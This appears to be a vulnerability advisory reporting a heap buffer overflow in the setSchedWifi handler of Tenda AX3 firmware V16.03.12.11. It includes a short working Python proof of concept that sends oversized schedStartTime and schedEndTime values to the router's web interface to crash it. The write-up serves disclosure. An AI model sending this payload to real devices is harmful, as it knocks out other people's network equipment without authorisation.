Information
===========

**Vendor of the products**: Tenda <br>

**Vendor's website**: https://www.tenda.com.cn <br>

**Reported by**: korey0sh1(korey0sh2@gmail.com) <br>

**Affected products**: Tenda AX3 <br>

**Affected firmware version**: V16.03.12.11 <br>

**Firmware download address**: https://www.tenda.com.cn/download/detail-3476.html <br>

Overview
===========

**Tenda AX3 V16.03.12.11** has a **heap buffer overflow** vulnerability detected at function **setSchedWifi**. This vulnerability allows attackers to cause a Denial of Service (DoS) via the **schedStartTime** parameter and **schedEndTime** paramter. <br>

Vulnerability details
=====================
The vulnerability is detected at **/bin/httpd** <br>

In the function **setSchedWifi**, the content obtained by program through parameter **schedStartTime** and **schedEndTime** given by http is passed to variable **v5** and **v6**. However ,they will be copyed to the **v10** which is a heap ptr without any length check. <br>
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/4.png) <br>

<br>

Proof of Code
====================
```python
from pwn import *
import requests

url = "http://192.168.0.1/goform/openSchedWifi"

payload = "a"*0x1000
data = {
    "schedStartTime": payload,
    "schedEndTime": payload,
}
res = requests.post(url=url,data=data)
print(res.text)
```

Attack Demo
========
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/7.png)
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/5.png)
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/6.png)
